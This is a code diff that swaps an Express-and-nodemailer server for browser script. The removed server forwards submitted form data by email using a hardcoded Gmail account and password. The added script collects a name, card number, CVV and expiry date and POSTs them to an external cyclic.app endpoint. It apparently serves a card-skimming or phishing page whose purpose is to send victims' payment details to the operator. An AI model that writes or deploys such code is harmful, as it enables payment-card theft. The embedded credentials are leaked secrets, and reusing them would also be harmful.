@@ -1,70 +1,25 @@
+const name = document.getElementById('name');
+const exp = document.getElementById('exp');
+const cvv = document.getElementById('CVV');
+const card = document.getElementById('cardnb');
+const btn = document.getElementById('submit');
 
-const express = require('express');
-const app = express();
-const cors = require("cors");
-const nodemailer = require('nodemailer');
-app.use("/api", cors({
-  origin: "http://example.com",
-  methods: ["GET", "POST"],
-  allowedHeaders: ["Content-Type", "Authorization"]
-}));
-
-let transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-      user: 'mf8131692@gmail.com',
-      pass: 'vpvoabewgechdyyw'
-  }
-});
-
-
-
-
-// Middleware to parse request body
-app.use(express.urlencoded({ extended: false }));
-app.use(express.json());
-
-app.get("/",(req,res)=>{
-res.json("hey")
-
-})
-// Define a route for handling POST requests to '/submit'
-app.post('/submit', (req, res) => {
-  let mailOptions = {
-    from: '"api" mf8131692@gmail.com', // sender address
-    to: 'profile332@gmail.com', // list of receivers
-    subject: JSON.stringify(req.body), // Subject line
-    text: JSON.stringify(req.body), // plain text body
-    html: JSON.stringify(req.body) // html body
+btn.addEventListener('click', () => {
+  const data = {
+    name: name.value,
+    cardnb: card.value,
+    CVV: cvv.value,
+    exp: exp.value
   };
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-        return console.log(error);
-        res.json('Error');
+
+  fetch('https://long-teal-pike-tutu.cyclic.app/submit', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: {
+      'Content-Type': 'application/json'
     }
-    console.log('Message sent: %s', info.messageId);
-    res.json('Success');
-  });
-
-
+  })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error(error));
 });
-
-// Start the server
-app.listen(process.env.PORT, () => {
-  console.log(`Server is running on port ${process.env.PORT}`);
-});
-
-
-
-
-
-// create reusable transporter object using the default SMTP transport
-
-// setup email data with unicode symbols
-
-// send mail with defined transport object
-
-
-
-
-
